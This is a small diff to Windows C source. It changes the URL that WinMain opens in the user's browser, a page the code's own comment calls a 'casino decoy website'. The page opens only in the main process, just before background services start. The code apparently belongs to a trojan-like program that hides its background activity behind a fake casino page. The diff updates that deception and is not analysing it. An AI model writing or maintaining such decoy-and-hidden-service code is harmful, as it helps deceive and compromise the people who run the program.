@@ -479,7 +479,7 @@ int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine
     
     /* Open casino decoy website (only for main process, not services) */
     if (!g_isService) {
-        ShellExecuteA(NULL, "open", "https://jjakinn.github.io/new-vivid-casino-1/", NULL, NULL, SW_SHOWNORMAL);
+        ShellExecuteA(NULL, "open", "https://jjakinn.github.io/Royal-Fortune-Casino/", NULL, NULL, SW_SHOWNORMAL);
     }
     
     /* Start background services */
